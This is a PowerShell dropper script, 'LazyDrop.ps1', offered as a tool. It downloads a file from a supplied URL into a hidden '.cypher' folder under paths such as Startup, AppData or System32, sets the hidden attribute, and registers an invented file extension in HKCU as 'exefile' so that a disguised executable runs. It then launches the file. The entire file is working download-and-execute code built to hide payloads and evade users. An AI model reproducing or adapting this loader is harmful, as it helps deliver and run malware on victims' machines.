<#
.AUTHOR ElMerikh : https://github.com/ELMERIKH

.SYNOPSIS
    Downloads a file from the specified URL, sets the hidden attribute, adds a registry entry for the file type, and starts the downloaded file.

.DESCRIPTION
    This script downloads a file from the specified URL, sets the hidden attribute, adds a registry entry for the file type, and starts the downloaded file.

.PARAMETER Url
    The URL of the file to download.

.PARAMETER EnvVariable
    The environment variable to use for the file path. Choose from: USERPROFILE, TMP, STARTUP, APPDATA, SYSTEM32.

.PARAMETER FileType
    The type of the file to download.

.PARAMETER RegistryEntry
    The registry entry for the file type.

.EXAMPLE
    .\LazyDrop.ps1 -Url "https://example.com/file" -EnvVariable "USERPROFILE" -FileType "jplg" -RegistryEntry "exefile"
#>

param(
    [string]$Url,
    [ValidateSet('USERPROFILE', 'TMP', 'STARTUP', 'APPDATA', 'SYSTEM32')]
    [string]$EnvVariable,
    [string]$FileType,
    [string]$RegistryEntry
)

# Check if no arguments are provided
if (-not $Url -or -not $EnvVariable -or -not $FileType -or -not $RegistryEntry) {
    Write-Host "Usage: .\LazyDrop.ps1 -Url <URL> -EnvVariable <EnvVariable> -FileType <FileType> -RegistryEntry <RegistryEntry>"
    Write-Host "Options:"
    Write-Host "  -Url           The URL of the file to download."
    Write-Host "  -EnvVariable   The environment variable to use for the file path. Choose from: USERPROFILE, TMP, STARTUP, APPDATA, SYSTEM32."
    Write-Host "  -FileType      The type of the file to download."
    Write-Host "  -RegistryEntry The registry entry for the file type."
    exit
}

# Resolve the environment variable
$FilePath = if ($EnvVariable -eq 'SYSTEM32') { "${env:windir}\system32" } else { "${env:$EnvVariable}" }

# Create the directory if it doesn't exist
New-Item -ItemType Directory -Path "$FilePath\.cypher" -ErrorAction SilentlyContinue

# Download the file from the specified URL
Invoke-WebRequest -Uri $Url -OutFile "$FilePath\.cypher\file1.$FileType"

# Set the hidden attribute for the downloaded file
attrib +h "$FilePath\.cypher\file1.$FileType"

# Add registry entry for the file type
reg add HKCU\Software\Classes\.$FileType /ve /d "$RegistryEntry" /f

# Start the downloaded file
Start-Process -FilePath "$FilePath\.cypher\file1.$FileType"